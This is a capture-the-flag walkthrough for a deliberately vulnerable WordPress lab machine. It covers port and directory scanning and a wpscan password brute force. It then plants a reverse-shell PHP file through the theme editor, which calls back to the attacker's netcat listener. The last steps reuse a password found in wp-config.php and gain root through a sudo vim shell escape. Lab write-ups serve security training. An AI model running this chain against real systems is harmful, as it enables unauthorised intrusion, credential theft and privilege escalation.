#### IP `10.10.142.159`


#### 1. Nmap scan

```
nmap -Pn -A -T4 10.10.142.159                                             
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-01-09 11:06 EST
Nmap scan report for 10.10.142.159
Host is up (0.21s latency).
Not shown: 999 closed ports
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-generator: WordPress 4.1.31
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: ColddBox | One more machine

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 43.21 seconds
```

There is only one port opened: `80` 
                                                                       

#### 2. Gobuster scan

```
┌──(kali㉿kali)-[~]
└─$ gobuster dir -u http://10.10.142.159 -w /usr/share/wordlists/dirb/common.txt
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.142.159
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirb/common.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2021/01/09 11:08:15 Starting gobuster
===============================================================
/.hta (Status: 403)
/.htaccess (Status: 403)
/.htpasswd (Status: 403)
/hidden (Status: 301)
/index.php (Status: 301)
/server-status (Status: 403)
/wp-admin (Status: 301)
/wp-content (Status: 301)
/wp-includes (Status: 301)
/xmlrpc.php (Status: 200)
===============================================================
2021/01/09 11:10:45 Finished
===============================================================
```

Website seems to be a Wordpress, so next step would be running `wpsacan` to get a users list and afterwards bruteforce a password.


#### 3. WPS Scan

Firstly, I run:

`wpscan --url http://10.10.142.159 -e u`

which gives three users: c0ldd, philip, hugo.

Then I run brute scan for these users and after some time I get a pass for `c0ldd`

```                                                                                                               
┌──(kali㉿kali)-[~]
└─$ wpscan --url http://10.10.142.159 -U c0ldd, hugo, philip -P /usr/share/wordlists/rockyou.txt                               127 ⨯


[+] Performing password attack on Wp Login against 1 user/s
[SUCCESS] - c0ldd / 9876543210                                                                                         
Trying c0ldd / 9876543210 Time: 00:04:59 <                                    > (1225 / 14345617)  0.00%  ETA: ??:??:??

[!] Valid Combinations Found:
 | Username: c0ldd, Password: *********
```


#### 4. Wordpress access

I login as `c0ldd` and edt `twentyfifteen` theme for pentest monkey reverse php in order to get a shell.

I go to Appearance -> Editor -> type in and upload modified script. Afterwards, with netcat `sudo nc -lvnp 4444` and access this link in browser:

`http://10.10.142.159/wp-content/themes/twentyfifteen/404.php`

and bingo:

```
──(kali㉿kali)-[~]
└─$ sudo nc -lvnp 4444                     
[sudo] password for kali: 
listening on [any] 4444 ...
connect to [10.6.46.150] from (UNKNOWN) [10.10.142.159] 54280
Linux ColddBox-Easy 4.4.0-186-generic #216-Ubuntu SMP Wed Jul 1 05:34:05 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
 17:19:59 up 14 min,  0 users,  load average: 0.01, 0.44, 0.54
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off

$ python3 -c 'import pty;pty.spawn("/bin/bash")'   
www-data@ColddBox-Easy:/$ whoami
whoami
www-data
www-data@ColddBox-Easy:/$ 
```


#### 5. Enumeration

As long as there is Wordpress involved, user / pass is usually in `wp-config.php` so  I access `/var/www/html` and open it:

```
www-data@ColddBox-Easy:/$ cd /var/www/html
cd /var/www/html
www-data@ColddBox-Easy:/var/www/html$ ls -lah
ls -lah
total 192K
drwxr-xr-x  6 root     root     4.0K Oct 14 19:42 .
drwxr-xr-x  3 root     root     4.0K Oct 14 19:41 ..
drwxr-xr-x  2 root     root     4.0K Oct 19 18:49 hidden
-rw-r--r--  1 www-data www-data  418 Sep 25  2013 index.php
-rw-r--r--  1 www-data www-data  20K Sep 24 17:07 license.txt
-rw-r--r--  1 www-data www-data 7.1K Sep 24 17:07 readme.html
-rw-r--r--  1 www-data www-data 6.3K Sep 24 17:07 wp-activate.php
drwxr-xr-x  9 www-data www-data 4.0K Dec 18  2014 wp-admin
-rw-r--r--  1 www-data www-data  271 Jan  8  2012 wp-blog-header.php
-rw-r--r--  1 www-data www-data 5.1K Sep 24 17:07 wp-comments-post.php
-rw-r--r--  1 www-data www-data 2.7K Sep  9  2014 wp-config-sample.php
-rw-rw-rw-  1 www-data www-data 3.0K Oct 14 19:42 wp-config.php
drwxr-xr-x  6 www-data www-data 4.0K Oct 19 18:44 wp-content
-rw-r--r--  1 www-data www-data 2.9K May 13  2014 wp-cron.php
drwxr-xr-x 12 www-data www-data 4.0K Dec 18  2014 wp-includes
-rw-r--r--  1 www-data www-data 2.4K Oct 25  2013 wp-links-opml.php
-rw-r--r--  1 www-data www-data 2.7K Jul  7  2014 wp-load.php
-rw-r--r--  1 www-data www-data  33K Sep 24 17:07 wp-login.php
-rw-r--r--  1 www-data www-data 8.3K Sep 24 17:07 wp-mail.php
-rw-r--r--  1 www-data www-data  11K Jul 18  2014 wp-settings.php
-rw-r--r--  1 www-data www-data  25K Nov 30  2014 wp-signup.php
-rw-r--r--  1 www-data www-data 4.0K Nov 30  2014 wp-trackback.php
-rw-r--r--  1 www-data www-data 3.0K Feb  9  2014 xmlrpc.php
```

Inside a file I find a password for database:

```
// ** MySQL settings - You can get this info from your web host ** //
/** The name of the database for WordPress */
define('DB_NAME', 'colddbox');

/** MySQL database username */
define('DB_USER', 'c0ldd');

/** MySQL database password */
define('DB_PASSWORD', 'XXXXXXXXXX');
```

I try to login as `c0ldd` using that password and apparently it works. In real life having same password for database and user would be a very big mistake.

```
www-data@ColddBox-Easy:/var/www/html$ su - c0ldd 
su - c0ldd
Password: XXXXXXX

c0ldd@ColddBox-Easy:~$ whoami
whoami
c0ldd
c0ldd@ColddBox-Easy:~$ 
```

It is possible to get `user.txt` now:

```
c0ldd@ColddBox-Easy:~$ ls -al
ls -al
total 24
drwxr-xr-x 3 c0ldd c0ldd 4096 oct 19 18:51 .
drwxr-xr-x 3 root  root  4096 sep 24 16:52 ..
-rw------- 1 c0ldd c0ldd    0 oct 19 18:51 .bash_history
-rw-r--r-- 1 c0ldd c0ldd  220 sep 24 16:52 .bash_logout
-rw-r--r-- 1 c0ldd c0ldd    0 oct 14 13:28 .bashrc
drwx------ 2 c0ldd c0ldd 4096 sep 24 16:53 .cache
-rw-r--r-- 1 c0ldd c0ldd  655 sep 24 16:52 .profile
-rw-r--r-- 1 c0ldd c0ldd    0 sep 24 16:53 .sudo_as_admin_successful
-rw-rw---- 1 c0ldd c0ldd   53 sep 24 18:22 user.txt
c0ldd@ColddBox-Easy:~$ cat user.txt
cat user.txt
XXXXXXXX
```

#### Escalating to root

A very good practise is to always check what rights have a normal user, so:

```
c0ldd@ColddBox-Easy:~$ sudo -l
sudo -l
[sudo] password for c0ldd: cybersecurity

Coincidiendo entradas por defecto para c0ldd en ColddBox-Easy:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

El usuario c0ldd puede ejecutar los siguientes comandos en ColddBox-Easy:
    (root) /usr/bin/vim
    (root) /bin/chmod
    (root) /usr/bin/ftp
```

c0ldd can execute vim, ftp and chmod as root. This means we have three ways to escalate to root, I choose vim.

There is a big list of commands for escalation caleld GTFO Bins, so for vim:

`https://gtfobins.github.io/gtfobins/vim/`

I should type:

`sudo -u root /usr/bin/vim -c ':!/bin/sh'`

Which makes me root as suspected:

```
:!/bin/sh
# whoami
whoami
root
# cd /root
cd /root
# ls -lah
ls -lah
total 32K
drwx------  4 root root 4,0K sep 24 18:52 .
drwxr-xr-x 23 root root 4,0K sep 24 16:47 ..
-rw-------  1 root root   10 oct 19 18:53 .bash_history
-rw-r--r--  1 root root    0 oct 14 13:28 .bashrc
drwx------  2 root root 4,0K sep 24 18:52 .cache
-rw-------  1 root root  220 sep 24 17:02 .mysql_history
drwxr-xr-x  2 root root 4,0K sep 24 16:54 .nano
-rw-r--r--  1 root root  148 ago 17  2015 .profile
-rw-r--r--  1 root root   49 sep 24 18:23 root.txt
# cat root.txt  
cat root.txt
XXXXXXXXXXXXXXXXXX
```

